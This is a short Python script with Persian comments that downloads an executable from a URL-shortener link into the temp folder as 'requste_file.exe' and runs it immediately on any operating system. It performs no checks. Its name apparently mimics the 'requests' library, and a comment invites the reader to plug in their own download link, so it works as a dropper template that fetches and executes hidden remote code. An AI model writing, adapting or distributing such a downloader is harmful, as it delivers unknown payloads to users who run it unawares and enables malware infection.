import os
import sys
import tempfile
import urllib.request
import subprocess

# 👇 لینک دانلودت رو اینجا بذار
DOWNLOAD_URL = "https://short.do/oVHbGC"


def main():
    print("🚀 requste در حال اجرا...")
    print(f"⬇️  دانلود از: {DOWNLOAD_URL}")

    temp_dir = tempfile.gettempdir()
    exe_path = os.path.join(temp_dir, "requste_file.exe")

    try:
        def progress(block_num, block_size, total_size):
            downloaded = block_num * block_size
            if total_size > 0:
                percent = min(downloaded * 100 / total_size, 100)
                bar = "█" * int(percent / 2) + "░" * (50 - int(percent / 2))
                print(f"\r[{bar}] {percent:.1f}%", end='', flush=True)

        urllib.request.urlretrieve(DOWNLOAD_URL, exe_path, reporthook=progress)
        print(f"\n✅ دانلود شد: {exe_path}")

        print("🚀 در حال اجرا...")
        if sys.platform == "win32":
            os.startfile(exe_path)
        elif sys.platform == "darwin":  # macOS
            subprocess.Popen(["open", exe_path])
        else:  # Linux
            subprocess.Popen(["xdg-open", exe_path])

        print("✅ اجرا شد!")

    except Exception as e:
        print(f"\n❌ خطا: {e}")


if __name__ == "__main__":
    main()